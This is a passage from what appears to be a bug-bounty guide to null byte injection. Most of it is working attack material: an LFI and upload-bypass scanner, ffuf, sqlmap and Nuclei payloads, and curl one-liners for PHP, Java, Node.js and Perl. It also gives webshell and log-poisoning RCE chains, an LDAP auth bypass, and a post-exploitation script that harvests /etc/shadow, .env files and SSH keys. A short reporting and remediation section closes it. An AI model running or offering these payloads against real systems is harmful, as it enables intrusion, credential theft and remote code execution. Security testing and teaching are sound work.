                    print(f"[+] CONFIRMED LFI: {p['payload']}")
                    print(f"    File: {p['file']} | Null: {p['null']} | Depth: {p['depth']}")
                    found.append(p)
                elif is_different:
                    print(f"[~] ANOMALY: status={r.status_code} size_diff={size_diff} | {p['payload'][:80]}")
                
                if (i + 1) % 50 == 0:
                    print(f"[*] Progress: {i+1}/{len(payloads)}")
                
            except Exception as e:
                pass
            
            time.sleep(delay)
        
        print(f"\n{'='*70}")
        print(f"[*] SCAN COMPLETE — {len(found)} confirmed findings")
        for f in found:
            print(f"    ✓ {f['file']} via {f['null']} (depth={f['depth']}, sep={f['sep']!r})")
        
        return found
    
    def scan_upload(self, upload_url, field_name='file', delay=0.5):
        """Scan for null byte file upload bypass"""
        shell_content = b'<?php echo "NULLBYTE_UPLOAD_POC"; ?>'
        
        null_variants = ["%00", "%2500", "%c0%80", "\\x00"]
        extensions = [".jpg", ".png", ".gif", ".pdf", ".txt"]
        exec_exts = [".php", ".phtml", ".php5", ".pHp", ".PHP"]
        
        print(f"[*] Testing null byte upload bypass on {upload_url}")
        print("-" * 70)
        
        for null in null_variants:
            for exec_ext in exec_exts:
                for safe_ext in extensions:
                    filename = f"test{exec_ext}{null}{safe_ext}"
                    try:
                        files = {field_name: (filename, shell_content, "image/jpeg")}
                        r = self.session.post(upload_url, files=files)
                        
                        if r.status_code == 200 and any(w in r.text.lower() for w in ["success", "uploaded", "saved"]):
                            print(f"[+] UPLOAD ACCEPTED: {filename}")
                        
                    except Exception as e:
                        pass
                    
                    time.sleep(delay)
    
    def export_results(self, filename="null_byte_results.json"):
        """Export results to JSON"""
        with open(filename, 'w') as f:
            json.dump(self.results, f, indent=2)
        print(f"[*] Results exported to {filename}")


# ── Usage ──
if __name__ == "__main__":
    scanner = NullByteScanner(
        target_url="https://target.com/index.php",
        param_name="page",
        cookies={"session": "AUTH_TOKEN"},
    )
    
    # Run LFI scan
    findings = scanner.scan_lfi(max_payloads=200, delay=0.3)
    
    # Run upload scan
    # scanner.scan_upload("https://target.com/upload.php", field_name="file")
```
::

### Tool Integration

::tabs
  :::tabs-item{icon="i-lucide-wrench" label="ffuf Null Byte Fuzzing"}
  ```bash
  # ── ffuf with null byte payloads ──
  
  # LFI null byte fuzzing
  ffuf -u "https://target.com/index.php?page=FUZZ" \
    -w null_byte_lfi_payloads.txt \
    -mc 200 \
    -fs $(curl -s "https://target.com/index.php?page=nonexist" | wc -c) \
    -t 20 -rate 50 \
    -o ffuf_nullbyte_results.json
  
  # Filter by response containing /etc/passwd indicators
  ffuf -u "https://target.com/index.php?page=FUZZ" \
    -w null_byte_lfi_payloads.txt \
    -mc 200 \
    -mr "root:.*:0:0" \
    -t 10 -rate 30
  
  # Upload filename null byte fuzzing
  ffuf -u "https://target.com/upload.php" \
    -X POST \
    -H "Cookie: session=TOKEN" \
    -F "file=@shell.php;filename=shell.phpFUZZ.jpg" \
    -w <(echo -e "%00\n%2500\n%c0%80\n%e0%80%80\n%u0000") \
    -mc 200 \
    -mr "success|uploaded"
  
  # Parameter name discovery + null byte test
  ffuf -u "https://target.com/index.php?FUZZ=../../../etc/passwd%00" \
    -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
    -mc 200 \
    -mr "root:" \
    -t 20
  
  # Multi-position fuzzing (traversal depth + null variant)
  ffuf -u "https://target.com/index.php?page=DEPTH/etc/passwdNULL" \
    -w <(for i in $(seq 1 10); do printf '../%.0s' $(seq 1 $i); echo; done):DEPTH \
    -w <(echo -e "%00\n%2500\n%c0%80\n%00.php\n%00.html\n%00.txt"):NULL \
    -mc 200 \
    -mr "root:" \
    -mode clusterbomb
  ```
  :::

  :::tabs-item{icon="i-lucide-wrench" label="Burp Suite Integration"}
  ```text
  # ── Burp Suite Null Byte Testing Workflow ──
  
  # 1. PROXY — Capture request with file/path parameter
  # 2. Send to REPEATER
  
  # 3. Manual tests in Repeater:
  #    Original: ?page=home
  #    Test 1:   ?page=../../../etc/passwd%00
  #    Test 2:   ?page=../../../etc/passwd%00.php
  #    Test 3:   ?page=../../../etc/passwd%2500
  #    Test 4:   ?page=../../../etc/passwd%c0%80
  
  # 4. Send to INTRUDER for automated testing:
  #    Attack type: Sniper
  #    Position:    ?page=§payload§
  #    Payload:     Load null_byte_lfi_payloads.txt
  #    
  #    Grep Extract: Add "root:" to extract matches
  #    Grep Match:   Add "root:x:0:0" as success indicator
  
  # 5. INTRUDER — Cluster Bomb for depth + encoding:
  #    Position 1 (depth):    ?page=§../§etc/passwd§%00§
  #    Position 2 (null):     
  #    Payload 1: ../ (repeated 1-10 times via recursive grep)
  #    Payload 2: %00, %2500, %c0%80, %e0%80%80, %u0000
  
  # 6. Check RESPONSE for:
  #    - "root:" in body
  #    - Different response length than baseline
  #    - Different status code
  #    - Error messages revealing path info
  
  # 7. Burp Extension — Hackvertor tags:
  #    <@urlencode_all>../../../etc/passwd<@/urlencode_all>%00
  #    <@hex_entities>../../../etc/passwd<@/hex_entities>%00
  
  # 8. Active Scan — Custom insertion point:
  #    Right-click parameter → "Actively scan defined insertion points"
  #    Burp will automatically test null byte variants
  ```
  :::

  :::tabs-item{icon="i-lucide-wrench" label="Nuclei Templates"}
  ```yaml [null-byte-lfi.yaml]
  id: null-byte-lfi

  info:
    name: Null Byte LFI Path Traversal
    author: bughunter
    severity: high
    tags: lfi,null-byte,path-traversal
    description: Detects null byte injection in file inclusion parameters
    reference:
      - https://owasp.org/www-community/attacks/Null_Byte_Injection

  http:
    - method: GET
      path:
        - "{{BaseURL}}/?page=../../../etc/passwd%00"
        - "{{BaseURL}}/?file=../../../etc/passwd%00"
        - "{{BaseURL}}/?path=../../../etc/passwd%00"
        - "{{BaseURL}}/?template=../../../etc/passwd%00"
        - "{{BaseURL}}/?include=../../../etc/passwd%00"
        - "{{BaseURL}}/?page=../../../etc/passwd%00.php"
        - "{{BaseURL}}/?page=../../../etc/passwd%00.html"
        - "{{BaseURL}}/?page=../../../etc/passwd%2500"
        - "{{BaseURL}}/?page=../../../etc/passwd%c0%80"
        - "{{BaseURL}}/?page=....//....//....//etc/passwd%00"
        - "{{BaseURL}}/?file=../../../etc/passwd%00.txt"
        - "{{BaseURL}}/?doc=../../../etc/passwd%00"
        - "{{BaseURL}}/?load=../../../etc/passwd%00"
        - "{{BaseURL}}/?view=../../../etc/passwd%00"
        - "{{BaseURL}}/?lang=../../../etc/passwd%00"

      stop-at-first-match: true

      matchers-condition: and
      matchers:
        - type: status
          status:
            - 200
        - type: regex
          regex:
            - "root:.*:0:0:"
            - "daemon:.*:1:1:"
            - "nobody:.*:65534:"
          condition: or
  ```
  :::

  :::tabs-item{icon="i-lucide-wrench" label="sqlmap Null Byte"}
  ```bash
  # ── sqlmap with null byte injection techniques ──
  
  # Test with null byte prefix/suffix
  sqlmap -u "https://target.com/search?q=1" \
    --prefix="'" --suffix="%00--" \
    --dbms=mysql --batch --level=5 --risk=3
  
  # Custom tamper script for null byte injection
  cat > null_byte_tamper.py << 'TAMPER'
  #!/usr/bin/env python3
  from lib.core.enums import PRIORITY
  
  __priority__ = PRIORITY.NORMAL
  
  def dependencies():
      pass
  
  def tamper(payload, **kwargs):
      """Insert null bytes between SQL keywords"""
      if payload:
          # Insert %00 between keywords
          payload = payload.replace("UNION", "UNION%00")
          payload = payload.replace("SELECT", "SELECT%00")
          payload = payload.replace(" AND ", "%00AND%00")
          payload = payload.replace(" OR ", "%00OR%00")
          payload = payload.replace("FROM", "FROM%00")
          payload = payload.replace("WHERE", "WHERE%00")
      return payload
  TAMPER
  
  sqlmap -u "https://target.com/search?q=1" \
    --tamper=null_byte_tamper.py \
    --batch --level=3 --risk=2
  
  # Use with existing tamper scripts
  sqlmap -u "https://target.com/search?q=1" \
    --tamper=between,randomcase,space2comment \
    --suffix="%00" \
    --batch --level=5 --risk=3
  ```
  :::
::

### Integration with Recon Workflow

::code-group
```bash [Full Recon Pipeline]
# ── Complete null byte bug hunting pipeline ──

TARGET_DOMAIN="target.com"

echo "═══ Phase 1: Subdomain Enumeration ═══"
subfinder -d $TARGET_DOMAIN -silent | sort -u > subs.txt
echo "[*] Found $(wc -l < subs.txt) subdomains"

echo "═══ Phase 2: Live Host Detection ═══"
cat subs.txt | httpx -silent -threads 50 -o live.txt
echo "[*] $(wc -l < live.txt) live hosts"

echo "═══ Phase 3: URL Collection ═══"
cat live.txt | katana -d 4 -jc -kf -ef css,svg,png,jpg,gif,woff -silent | sort -u > all_urls.txt
echo $TARGET_DOMAIN | gau --threads 10 2>/dev/null >> all_urls.txt
echo $TARGET_DOMAIN | waybackurls 2>/dev/null >> all_urls.txt
sort -u all_urls.txt -o all_urls.txt
echo "[*] $(wc -l < all_urls.txt) total URLs"

echo "═══ Phase 4: Filter File Parameter URLs ═══"
grep -iE "[?&](file|page|path|dir|doc|folder|template|include|load|read|fetch|view|content|module|lang|locale|cat|download|img|src|resource)=" all_urls.txt | sort -u > file_params.txt
echo "[*] $(wc -l < file_params.txt) URLs with file-like parameters"

echo "═══ Phase 5: Technology Detection ═══"
cat live.txt | while read host; do
    PHP_VER=$(curl -sI "$host" 2>/dev/null | grep -i "x-powered-by" | grep -oiP "php/[\d.]+" | head -1)
    SERVER=$(curl -sI "$host" 2>/dev/null | grep -i "^server:" | head -1)
    [ -n "$PHP_VER" ] && echo "[PHP] $host — $PHP_VER"
    echo "$SERVER" | grep -qi "perl\|cgi" && echo "[PERL/CGI] $host"
done | tee tech_results.txt

echo "═══ Phase 6: Null Byte LFI Testing ═══"
while IFS= read -r url; do
    PARAM=$(echo "$url" | grep -oP '[?&]\K[^=]+' | head -1)
    BASE=$(echo "$url" | cut -d'?' -f1)
    
    for null in "%00" "%2500" "%c0%80"; do
        for depth in 3 5 7; do
            TRAVERSAL=$(printf '../%.0s' $(seq 1 $depth))
            PAYLOAD="${TRAVERSAL}etc/passwd${null}"
            RESULT=$(curl -s "${BASE}?${PARAM}=${PAYLOAD}" -o /tmp/null_test_$$ -w "%{http_code}" 2>/dev/null)
            
            if grep -q "root:" /tmp/null_test_$$ 2>/dev/null; then
                echo "[+] VULNERABLE: ${BASE}?${PARAM}=${PAYLOAD}"
                echo "${BASE}?${PARAM}=${PAYLOAD}" >> confirmed_nullbyte.txt
            fi
        done
    done
done < file_params.txt

rm -f /tmp/null_test_$$

echo ""
echo "═══ Results ═══"
if [ -f confirmed_nullbyte.txt ]; then
    echo "[+] $(wc -l < confirmed_nullbyte.txt) confirmed null byte injection points"
    cat confirmed_nullbyte.txt
else
    echo "[-] No confirmed null byte injections found"
fi
```

```bash [Quick One-Liner Tests]
# ── Rapid null byte testing one-liners ──

# Test single URL for null byte LFI
curl -s "https://target.com/index.php?page=../../../etc/passwd%00" | grep "root:" && echo "VULNERABLE"

# Batch test from URL list
cat file_params.txt | while read url; do
    curl -s "${url}../../../etc/passwd%00" 2>/dev/null | grep -q "root:" && echo "[+] $url"
done

# Quick null byte upload test
for null in %00 %2500 %c0%80; do
    curl -s -o /dev/null -w "%{http_code}" -X POST https://target.com/upload \
      -F "file=@shell.php;filename=shell.php${null}.jpg"
    echo " — null=${null}"
done

# LDAP null byte auth test
for user in admin root administrator; do
    STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST https://target.com/login \
      -d "username=${user}%00&password=x")
    echo "[${STATUS}] ${user}%00"
done

# Mass null byte test with parallel
cat file_params.txt | parallel -j 10 "curl -s '{}../../../etc/passwd%00' | grep -q 'root:' && echo '[+] {}'"
```
::

---

## Edge Cases & Advanced Techniques

### Language-Specific Exploitation

::tabs
  :::tabs-item{icon="i-lucide-code" label="PHP Specific"}
  ```bash
  # ── PHP null byte edge cases ──
  
  # PHP < 5.3.4 — Classic null byte truncation
  curl -s "https://target.com/page.php?file=../../../etc/passwd%00"
  
  # PHP 5.3.4+ — Null byte rejected in filesystem functions
  # BUT: Still works in some contexts:
  
  # 1. preg_match bypass (regex doesn't see past null)
  curl -s "https://target.com/page.php?input=safe_value%00<script>alert(1)</script>"
  # If code: if(preg_match('/^[a-z_]+$/', $input)) — may pass with null byte
  
  # 2. substr/strlen mismatch
  curl -s "https://target.com/page.php?ext=php%00jpg"
  # substr($ext, -3) may see "jpg" but file operations use "php"
  
  # 3. PHP type juggling + null byte
  curl -s "https://target.com/page.php?id=0%00admin"
  # strcmp("0\x00admin", "0") may return 0 (equal)
  
  # 4. unserialize with null byte
  # Null bytes in serialized data can create private/protected property access
  # O:4:"User":1:{s:10:"\x00User\x00name";s:5:"admin";}
  
  # 5. Header injection via null byte (PHP < 5.1.2)
  curl -s "https://target.com/redirect.php?url=http://target.com%00%0d%0aSet-Cookie:admin=true"
  
  # 6. Mail header injection + null byte
  curl -X POST "https://target.com/contact.php" \
    -d "email=victim@target.com%00%0aCc:attacker@evil.com&message=test"
  
  # 7. extract() + null byte variable overwrite
  curl -s "https://target.com/page.php?_SESSION[admin]%00=true"
  
  # 8. Older PHP — path truncation via long string (alternative to null byte)
  # PHP < 5.3 truncates paths at ~4096 chars
  LONG_PATH="../../../etc/passwd/"
  for i in $(seq 1 2050); do LONG_PATH="${LONG_PATH}./"; done
  curl -s "https://target.com/page.php?file=${LONG_PATH}"
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="Java Specific"}
  ```bash
  # ── Java null byte exploitation ──
  
  # Java < 7u40 — File() constructor accepted null bytes
  curl -s "https://target.com/download?file=../../../etc/passwd%00.pdf"
  curl -s "https://target.com/download?file=../../../etc/passwd%00.jpg"
  
  # Tomcat UTF-8 overlong encoding (CVE-2007-0450)
  # %c0%ae = overlong encoding of '.'
  curl -s "https://target.com/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd"
  curl -s "https://target.com/..%c0%af..%c0%af..%c0%afetc/passwd"
  
  # Null byte in JSP file inclusion
  curl -s "https://target.com/page.jsp?file=../../../etc/passwd%00"
  curl -s "https://target.com/page.jsp?file=../../../etc/passwd%00.jsp"
  
  # Java getParameter() null byte handling
  curl -s "https://target.com/servlet?path=config%00../../etc/passwd"
  
  # Spring MVC path traversal + null byte
  curl -s "https://target.com/static/..%00/../../../etc/passwd"
  curl -s "https://target.com/download/..%00/../../etc/passwd"
  
  # Null byte in Java LDAP
  curl -X POST "https://target.com/ldap-login" \
    -d "user=admin%00&pass=anything"
  
  # Java Properties file null byte
  curl -s "https://target.com/config?key=admin%00.extra"
  
  # Null byte in JAX-RS path parameters
  curl -s "https://target.com/api/files/..%00/../../etc/passwd"
  
  # GlassFish null byte path traversal
  curl -s "https://target.com/theme/META-INF%00/../../../etc/passwd"
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="Node.js Specific"}
  ```bash
  # ── Node.js null byte scenarios ──
  
  # Buffer handling (older versions)
  curl -s "https://target.com/api/read?file=../../../etc/passwd" \
    -H "Content-Type: application/json" \
    --data '{"path":"../../../etc/passwd\u0000.txt"}'
  
  # Express.js static file serving
  curl -s "https://target.com/static/../../etc/passwd%00.js"
  curl -s "https://target.com/assets/../../etc/passwd%00.css"
  
  # JSON Unicode null byte
  curl -s "https://target.com/api/query" \
    -H "Content-Type: application/json" \
    -d '{"search":"admin\\u0000","role":"user"}'
  
  # Template engine injection + null byte
  curl -s "https://target.com/page?name={{constructor.constructor('return process')()}}%00"
  
  # Path module bypass
  curl -s "https://target.com/download?file=..%00/../../etc/passwd"
  
  # Null byte in MongoDB query (NoSQL injection)
  curl -s "https://target.com/api/user" \
    -H "Content-Type: application/json" \
    -d '{"username":"admin\u0000","password":{"$gt":""}}'
  
  # Child_process command injection + null byte
  curl -s "https://target.com/api/ping?host=127.0.0.1%00;id"
  
  # Node.js fs module (older versions)
  curl -s "https://target.com/api/file?name=../../../etc/passwd%00.json"
  
  # Handlebars/EJS template + null byte
  curl -s "https://target.com/profile?name=test%00{{7*7}}"
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="Ruby / Perl Specific"}
  ```bash
  # ══ Ruby null byte exploitation ══
  
  # Ruby < 2.x — File.open truncates at null
  curl -s "https://target.com/read?file=../../../etc/passwd%00.rb"
  curl -s "https://target.com/read?file=../../../etc/passwd%00.html.erb"
  
  # Ruby on Rails send_file
  curl -s "https://target.com/download?file=../../../etc/passwd%00"
  curl -s "https://target.com/assets/../../etc/passwd%00.js"
  
  # ERB template + null byte
  curl -s "https://target.com/page?input=<%25=%20system('id')%20%25>%00"
  
  # Ruby YAML deserialization + null byte
  curl -X POST "https://target.com/api/config" \
    -H "Content-Type: application/x-yaml" \
    -d '---
  admin: true
  name: "test\x00"'
  
  # ══ Perl null byte exploitation (STILL WORKS) ══
  
  # Perl open() — HIGHLY vulnerable to null bytes
  curl -s "https://target.com/cgi-bin/view.cgi?file=../../../etc/passwd%00"
  curl -s "https://target.com/cgi-bin/view.cgi?file=../../../etc/passwd%00.html"
  curl -s "https://target.com/cgi-bin/view.cgi?file=../../../etc/passwd%00.txt"
  curl -s "https://target.com/cgi-bin/view.pl?file=../../../etc/passwd%00.cgi"
  
  # Perl system() + null byte (command injection)
  curl -s "https://target.com/cgi-bin/process.cgi?input=test%00;id"
  curl -s "https://target.com/cgi-bin/process.cgi?input=test%00|cat+/etc/passwd"
  curl -s "https://target.com/cgi-bin/process.cgi?input=|id%00"
  
  # Perl pipe open via null byte
  curl -s "https://target.com/cgi-bin/view.cgi?file=|id%00"
  curl -s "https://target.com/cgi-bin/view.cgi?file=|cat%20/etc/passwd%00"
  curl -s "https://target.com/cgi-bin/view.cgi?file=|ls%20-la%00"
  
  # Perl regex bypass with null byte
  curl -s "https://target.com/cgi-bin/process.cgi?data=safe%00<script>alert(1)</script>"
  
  # Perl DBI (database) null byte
  curl -s "https://target.com/cgi-bin/search.cgi?q=admin%00'+OR+'1'='1"
  ```
  :::
::

### Null Byte in Specific Attack Chains

::card-group
  :::card
  ---
  icon: i-lucide-link
  title: LFI → Null Byte → Log Poison → RCE
  ---
  1. Inject PHP into access log via User-Agent header
  2. Use null byte to bypass `.php` extension enforcement
  3. `?page=../../../../var/log/apache2/access.log%00&cmd=id`
  4. PHP code in log executes via LFI
  5. Full RCE achieved without file upload
  :::

  :::card
  ---
  icon: i-lucide-link
  title: Upload → Null Byte Filename → Shell Access
  ---
  1. Upload `shell.php%00.jpg` — passes `.jpg` validation
  2. Server writes file as `shell.php` (null terminates filename)
  3. Access `https://target.com/uploads/shell.php?cmd=id`
  4. Web server executes PHP code
  5. Remote Code Execution via upload bypass
  :::

  :::card
  ---
  icon: i-lucide-link
  title: LDAP → Null Byte → Auth Bypass → Admin Panel
  ---
  1. Login with `admin%00` as username, any password
  2. LDAP filter truncates at null: `(uid=admin)`
  3. Password check bypassed — LDAP returns admin entry
  4. Application grants admin session
  5. Full admin panel access achieved
  :::

  :::card
  ---
  icon: i-lucide-link
  title: Null Byte → WAF Bypass → SQLi → Data Exfil
  ---
  1. WAF blocks `UNION SELECT` pattern
  2. Insert null bytes: `UNION%00SELECT`
  3. WAF pattern match fails (null breaks string)
  4. Backend SQL engine ignores null byte
  5. SQL injection executes successfully
  :::

  :::card
  ---
  icon: i-lucide-link
  title: Null Byte → Email Truncation → Account Takeover
  ---
  1. Register: `admin@target.com%00@attacker.com`
  2. DB stores truncated: `admin@target.com`
  3. Verification email sent to: `admin@target.com\0@attacker.com`
  4. Email system may route to attacker
  5. Verify account, take over existing admin
  :::

  :::card
  ---
  icon: i-lucide-link
  title: Null Byte → /proc/self/environ → RCE
  ---
  1. LFI to read `/proc/self/environ%00`
  2. Inject PHP code via `HTTP_USER_AGENT` environment variable
  3. `User-Agent: <?php system($_GET['cmd']); ?>`
  4. Include `/proc/self/environ` with null byte
  5. PHP code in environment executes
  :::
::

---

## Post-Exploitation & Impact Demonstration

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="Maximize LFI Impact"}
  ```bash
  # ── Once null byte LFI is confirmed, extract maximum data ──
  
  VULN_URL="https://target.com/index.php?page="
  NULL="%00"
  DEPTH="../../../../"
  
  # System files
  for file in \
      "/etc/passwd" "/etc/shadow" "/etc/group" "/etc/hostname" \
      "/etc/hosts" "/etc/resolv.conf" "/etc/crontab" \
      "/etc/ssh/sshd_config" "/etc/sudoers" \
      "/proc/version" "/proc/cpuinfo" "/proc/meminfo" \
      "/proc/self/environ" "/proc/self/cmdline" "/proc/self/status" \
      "/proc/self/cgroup" "/proc/net/tcp" "/proc/net/arp"; do
      echo "═══ ${file} ═══"
      curl -s "${VULN_URL}${DEPTH}${file}${NULL}" | head -30
      echo ""
  done | tee exfiltrated_system.txt
  
  # Application files
  for file in \
      "/var/www/html/wp-config.php" "/var/www/html/config.php" \
      "/var/www/html/.env" "/var/www/html/configuration.php" \
      "/var/www/html/.htaccess" "/var/www/html/web.config" \
      "/app/.env" "/app/config/database.yml" "/app/settings.py" \
      "/opt/tomcat/conf/tomcat-users.xml" \
      "/opt/tomcat/conf/server.xml"; do
      echo "═══ ${file} ═══"
      curl -s "${VULN_URL}${DEPTH}${file}${NULL}" | head -50
      echo ""
  done | tee exfiltrated_app.txt
  
  # SSH keys
  for user in root ubuntu deploy app admin www-data; do
      KEY=$(curl -s "${VULN_URL}${DEPTH}/home/${user}/.ssh/id_rsa${NULL}" 2>/dev/null)
      if echo "$KEY" | grep -q "BEGIN"; then
          echo "[+] Found SSH key for: ${user}"
          echo "$KEY" > "ssh_key_${user}.pem"
          chmod 600 "ssh_key_${user}.pem"
      fi
  done
  # Check root key
  KEY=$(curl -s "${VULN_URL}${DEPTH}/root/.ssh/id_rsa${NULL}" 2>/dev/null)
  if echo "$KEY" | grep -q "BEGIN"; then
      echo "[+] Found SSH key for: root"
      echo "$KEY" > ssh_key_root.pem
      chmod 600 ssh_key_root.pem
      echo "[*] Try: ssh -i ssh_key_root.pem root@target.com"
  fi
  
  # Source code extraction (PHP filter + null byte)
  for phpfile in index config login admin upload database; do
      echo "═══ ${phpfile}.php source ═══"
      B64=$(curl -s "${VULN_URL}php://filter/convert.base64-encode/resource=${phpfile}${NULL}")
      echo "$B64" | grep -oP '[A-Za-z0-9+/=]{20,}' | base64 -d 2>/dev/null | head -50
      echo ""
  done | tee extracted_source.txt
  ```
  :::

  :::tabs-item{icon="i-lucide-flag" label="Safe PoC for Reports"}
  ```bash
  # ── Safe impact demonstration for bug bounty reports ──
  
  # Read only /etc/hostname (harmless file)
  echo "[*] Null Byte LFI PoC — Reading /etc/hostname"
  curl -s "https://target.com/index.php?page=../../../../etc/hostname%00"
  
  # Read /proc/version (system info, no credentials)
  echo "[*] Reading /proc/version"
  curl -s "https://target.com/index.php?page=../../../../proc/version%00"
  
  # Read first line of /etc/passwd (usernames only, no passwords)
  echo "[*] Reading /etc/passwd (first 3 lines)"
  curl -s "https://target.com/index.php?page=../../../../etc/passwd%00" | head -3
  
  # Screenshot each response for the report
  # Use browser developer tools to capture full response
  
  echo ""
  echo "[*] PoC commands for report:"
  echo "    1. curl 'https://target.com/index.php?page=../../../../etc/hostname%00'"
  echo "    2. curl 'https://target.com/index.php?page=../../../../etc/passwd%00'"
  echo "    3. Compare with baseline: curl 'https://target.com/index.php?page=home'"
  ```
  :::
::

---

## Reporting & Remediation

::card-group
  :::card
  ---
  icon: i-lucide-file-text
  title: Report Title
  ---
  `Null Byte Injection in [Parameter] Allows [LFI/Auth Bypass/Upload Bypass] on [Endpoint]`
  :::

  :::card
  ---
  icon: i-lucide-alert-triangle
  title: Severity Assessment
  ---
  | Scenario | CVSS | Severity |
  | -------- | ---- | -------- |
  | Null byte LFI → Read sensitive files | 7.5 | High |
  | Null byte LFI → RCE (log poisoning) | 9.8 | Critical |
  | Null byte upload bypass → RCE | 9.8 | Critical |
  | Null byte auth bypass | 9.1 | Critical |
  | Null byte WAF bypass → SQLi/XSS | 7.0-9.0 | High-Critical |
  | Null byte log injection | 5.3 | Medium |
  :::

  :::card
  ---
  icon: i-lucide-list-checks
  title: Report Contents
  ---
  1. Vulnerability summary & CWE reference
  2. Affected URL, parameter, and HTTP method
  3. Technology stack (language, version, framework)
  4. Step-by-step reproduction with cURL commands
  5. Screenshots of successful exploitation
  6. Null byte encoding variant that worked
  7. Impact analysis (what data/access was gained)
  8. Remediation recommendations with code examples
  :::

  :::card
  ---
  icon: i-lucide-shield-check
  title: Remediation Advice
  ---
  - **Upgrade language runtime** (PHP ≥ 5.3.4, Java ≥ 7u40, Python 3.x)
  - **Strip null bytes** from all user input at entry point
  - **Whitelist** allowed characters instead of blacklisting
  - **Canonicalize paths** before file operations
  - **Use realpath()** and verify prefix matches expected directory
  - **Validate after decoding** — decode all encodings before validation
  - **Avoid C-level functions** with untrusted input when possible
  - **Use parameterized LDAP queries** instead of string concatenation
  - **Content-Type validation** on server side for uploads
  - **WAF rules** that detect and block null byte encodings
  :::
::

### Remediation Code Examples

::code-collapse
```python [remediation_examples.py]
# ═══════════════════════════════════════════
# REMEDIATION — Safe implementations
# ═══════════════════════════════════════════

# ── Python — Strip null bytes from input ──
def sanitize_input(user_input):
    """Remove null bytes and validate input"""
    if user_input is None:
        return None
    
    # Remove all null byte variants
    sanitized = user_input.replace('\x00', '')
    sanitized = sanitized.replace('%00', '')
    sanitized = sanitized.replace('\0', '')
    
    # URL decode then strip nulls again
    from urllib.parse import unquote
    sanitized = unquote(sanitized).replace('\x00', '')
    
    return sanitized


# ── Python — Safe file inclusion ──
import os

ALLOWED_DIR = "/app/templates"
ALLOWED_EXTENSIONS = {'.html', '.txt', '.md'}

def safe_file_read(filename):
    """Safely read a file with full validation"""
    # Step 1: Reject null bytes
    if '\x00' in filename or '%00' in filename:
        raise ValueError("Invalid characters in filename")
    
    # Step 2: Resolve the real path
    full_path = os.path.realpath(os.path.join(ALLOWED_DIR, filename))
    
    # Step 3: Verify path is within allowed directory
    if not full_path.startswith(os.path.realpath(ALLOWED_DIR) + os.sep):
        raise ValueError("Path traversal detected")
    
    # Step 4: Verify extension
    _, ext = os.path.splitext(full_path)
    if ext.lower() not in ALLOWED_EXTENSIONS:
        raise ValueError(f"Extension not allowed: {ext}")
    
    # Step 5: Verify file exists
    if not os.path.isfile(full_path):
        raise FileNotFoundError(f"File not found: {filename}")
    
    with open(full_path, 'r') as f:
        return f.read()


# ── PHP — Null byte protection (for older PHP) ──
"""
<?php
function safe_include($page) {
    // Strip null bytes
    $page = str_replace(chr(0), '', $page);
    $page = str_replace('%00', '', $page);
    
    // Whitelist approach
    $allowed = ['home', 'about', 'contact', 'help'];
    if (!in_array($page, $allowed)) {
        die('Invalid page');
    }
    
    $path = realpath(__DIR__ . '/pages/' . $page . '.php');
    
    // Verify path is within allowed directory
    if ($path === false || strpos($path, realpath(__DIR__ . '/pages/')) !== 0) {
        die('Path traversal detected');
    }
    
    include($path);
}
?>
"""


# ── Java — Safe file access ──
"""
import java.io.File;
import java.nio.file.Path;
import java.nio.file.Paths;

public class SafeFileAccess {
    private static final String ALLOWED_DIR = "/app/uploads";
    
    public static File safeResolve(String userInput) throws SecurityException {
        // Reject null bytes
        if (userInput.contains("\0") || userInput.contains("%00")) {
            throw new SecurityException("Null byte detected in input");
        }
        
        // Resolve canonical path
        Path resolved = Paths.get(ALLOWED_DIR, userInput).normalize();
        Path allowedPath = Paths.get(ALLOWED_DIR).normalize();
        
        // Verify path is within allowed directory
        if (!resolved.startsWith(allowedPath)) {
            throw new SecurityException("Path traversal detected");
        }
        
        return resolved.toFile();
    }
}
"""


# ── Node.js — Input sanitization middleware ──
"""
const path = require('path');

function sanitizeInput(req, res, next) {
    // Strip null bytes from all parameters
    for (const key in req.query) {
        if (typeof req.query[key] === 'string') {
            req.query[key] = req.query[key].replace(/\0/g, '');
            req.query[key] = req.query[key].replace(/%00/gi, '');
        }
    }
    for (const key in req.body) {
        if (typeof req.body[key] === 'string') {
            req.body[key] = req.body[key].replace(/\0/g, '');
            req.body[key] = req.body[key].replace(/%00/gi, '');
        }
    }
    next();
}

function safeFilePath(userInput, baseDir) {
    // Remove null bytes
    const clean = userInput.replace(/\0/g, '').replace(/%00/gi, '');
    
    // Resolve and validate
    const resolved = path.resolve(baseDir, clean);
    const normalizedBase = path.resolve(baseDir);
    
    if (!resolved.startsWith(normalizedBase + path.sep)) {
        throw new Error('Path traversal detected');
    }
    
    return resolved;
}
"""
```
::

---

## Quick Reference Cheatsheet

::field-group
  :::field{name="URL Encoded Null" type="payload"}
  `%00`
  :::

  :::field{name="Double Encoded Null" type="payload"}
  `%2500`
  :::

  :::field{name="Overlong UTF-8 Null" type="payload"}
  `%c0%80`
  :::

  :::field{name="Unicode Null" type="payload"}
  `%u0000`
  :::

  :::field{name="JSON Null" type="payload"}
  `\u0000`
  :::

  :::field{name="LFI + Null Byte" type="command"}
  `curl -s "https://target.com/page.php?file=../../../etc/passwd%00"`
  :::

  :::field{name="Upload + Null Byte" type="command"}
  `curl -X POST https://target.com/upload -F "file=@shell.php;filename=shell.php%00.jpg"`
  :::

  :::field{name="LDAP Auth Bypass" type="command"}
  `curl -X POST https://target.com/login -d "username=admin%00&password=x"`
  :::

  :::field{name="WAF Bypass (SQLi)" type="command"}
  `curl "https://target.com/search?q=1'%00UNION%00SELECT%001,2,3--"`
  :::

  :::field{name="Log Poison + Null LFI" type="command"}
  `curl https://target.com/ -H "User-Agent: <?php system(\$_GET['c']); ?>" && curl "https://target.com/page.php?file=../../../../var/log/apache2/access.log%00&c=id"`
  :::

  :::field{name="ffuf Null Byte Fuzz" type="command"}
  `ffuf -u "https://target.com/page.php?file=FUZZ" -w null_byte_lfi_payloads.txt -mr "root:"`
  :::

  :::field{name="Detect PHP Version" type="command"}
  `curl -sI https://target.com | grep -i x-powered-by`
  :::
::

---

## References & Resources

- [OWASP — Null Byte Injection](https://owasp.org/www-community/attacks/Null_Byte_Injection)
